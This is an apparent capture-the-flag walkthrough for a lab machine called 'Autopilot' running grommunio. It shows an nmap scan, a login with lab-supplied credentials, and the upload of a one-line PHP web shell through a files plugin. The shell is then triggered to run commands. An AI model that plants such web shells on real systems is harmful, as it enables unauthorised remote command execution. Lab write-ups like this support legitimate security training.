# Autopilot

<img width="1584" height="297" alt="image" src="https://github.com/user-attachments/assets/7087902f-fe06-45b4-88ec-4f447f446c30" />

---

## nmap scan

```ruby
─$ nmap -sCV -Pn 10.129.87.212
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-17 19:28 UTC
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 19:30 (0:00:00 remaining)
Nmap scan report for 10.129.87.212
Host is up (0.41s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx
| tls-alpn: 
|   h2
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=grommunio.autopilot.htb/organizationName=Autopilot/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:grommunio.autopilot.htb, DNS:autodiscover.autopilot.htb, DNS:mail.autopilot.htb
| Not valid before: 2026-07-15T16:20:23
|_Not valid after:  2101-06-27T16:20:23
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.26 seconds

```



## open web site on port `443` and login with credentials in machine bio:

```
deborah.hernandez / 8F5cgp@tC8g@
```

<img width="1919" height="801" alt="image" src="https://github.com/user-attachments/assets/ec2eafd7-dea7-476c-a3c0-21d5984f9e17" />

## digging into sittings found some plugins 

<img width="1919" height="581" alt="image" src="https://github.com/user-attachments/assets/20d80938-3606-445a-add9-d8226ee955c7" />

## in files plugin  add files account

<img width="1919" height="621" alt="image" src="https://github.com/user-attachments/assets/8e17cdb3-6960-47fe-9867-ad876ebc981f" />

## i will try to upload simple webshell 

```php
<?php system($_GET['cmd']); ?>
```

<img width="1919" height="448" alt="image" src="https://github.com/user-attachments/assets/76f2569f-b918-4786-b288-891154ff7dd1" />

## but here it's uploaded path i checked :

```
https://grommunio.autopilot.htb/files/index.php/apps/files/files
```

**`and found the path `**

<img width="1916" height="580" alt="image" src="https://github.com/user-attachments/assets/958a3940-11b5-43fb-92e5-1306fdb79906" />

## now let's trigger it 

```
https://10.129.234.223/files/data/deborah.hernandez/files/shell.php?cmd=id
```

<img width="1245" height="219" alt="image" src="https://github.com/user-attachments/assets/ef6efe50-4d00-4cea-b434-082207321dc4" />

## bingo we got webshell


















